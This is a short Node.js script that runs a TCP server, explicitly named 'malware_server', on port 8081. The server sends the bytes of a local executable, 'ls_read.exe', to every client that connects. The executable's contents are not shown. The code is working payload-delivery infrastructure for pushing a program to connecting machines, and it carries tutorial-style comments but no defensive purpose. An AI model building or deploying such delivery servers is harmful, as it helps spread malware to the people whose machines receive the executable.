const net = require("node:net");
const fs = require("fs");
const EXE_PATH = "./ls_read.exe";

// This is a TCP server. For UDP, just use a datagram
const malware_server = net.createServer({keepAlive: false}, connection => {
    // Note that we don't need an extra event listener to check for connection - since the callback happens *when* a connection event is fired

    console.log(`Connected to: ${connection.remoteAddress}:${connection.remotePort}.`);
    console.log(`Server running on ${connection.remoteFamily}`);

    // Send the EXE file data upon connection
    fs.readFile(EXE_PATH, (err, data) => {
        if (err)
        {
            console.error(err);
        }
        else
        {
            // 🚨 socket.write is sync
            connection.write(data, err => {
                if (err)
                {
                    console.error(err);
                }
                else
                {
                    console.log("Data written.")
                    console.log("");
                }
            });
        }

        connection.end();
    })
});

malware_server.listen(8081);
console.log("Server up and running on port 8081");